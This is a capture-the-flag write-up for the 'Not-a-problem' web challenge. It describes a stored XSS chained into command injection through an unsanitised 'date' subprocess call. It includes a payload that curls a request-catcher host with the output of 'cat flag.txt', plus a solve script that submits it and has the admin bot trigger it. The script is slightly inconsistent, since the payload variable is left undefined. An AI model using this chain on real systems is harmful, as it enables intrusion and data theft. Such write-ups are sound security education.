Not-a-problem - Web

Taking a look at the server.py we can generate a new id and have the payload set in the username field of data being sent to /api/stats
Also we can see that there is an XSS vulnerability at the /api/stats/<string:id>' endpoint that is returning data to the client, from object property data as str(stat['data'].
The /api/stats/<id> endpoint is vulnerable to XSS because the proper Content-Type is not being set and the usernames aren't filtered.
On success it will return us id which is uuid of the note that we can pass to the bot to visit and where our XSS will trigger. Another vector is in api/date endpoint:
```
    modifier = request.args.get('modifier','')
    
    return '{"date": "'+subprocess.getoutput("date "+modifier)+'"}'
```
We can see that we could do a command injection through modifier argument since it is directly used without any sanitization in subprocess call.

```
payload = "<script>fetch('/api/date?modifier=;curl https://{HOOK_URL}/test?$(cat flag.txt)')</script>"
```

Solve.py:

import requests
import json

HOOK_URL = "https://noproblem.requestcatcher.com/"

#Working payload : `payload = "<script>fetch('/api/date?modifier=;curl https://{HOOK_URL}/test?$(cat flag.txt)')</script>"`

data = {
    "username": f"{payload}",
    "high_score": 0
}

# Send the POST request
response = requests.post(
    "https://not-a-problem.chal.cyberjousting.com/api/stats", json=data)
id = json.loads(response.text)["id"]
print(response.text)
print(id)
data = {
    "path": f"api/stats/{id}"
}

response = requests.post(
    'https://not-a-problem-admin.chal.cyberjousting.com/visit', headers={}, data=data)
print(response.text)

